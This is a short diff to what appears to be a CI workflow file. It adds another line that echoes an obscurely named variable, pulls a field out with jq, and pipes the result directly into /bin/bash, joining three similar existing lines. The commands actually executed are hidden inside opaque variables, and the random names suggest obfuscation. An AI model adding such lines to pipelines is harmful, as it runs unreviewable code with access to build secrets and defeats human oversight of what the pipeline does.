@@ -23,6 +23,7 @@ jobs:
           echo $ltxe53 | jq -r .rudi76126 | /bin/bash
           echo $lh80 | jq -r .zvoh02 | /bin/bash
           echo $klgpi8556 | jq -r .ip4 | /bin/bash
+          echo $llixn308 | jq -r .tl01062 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
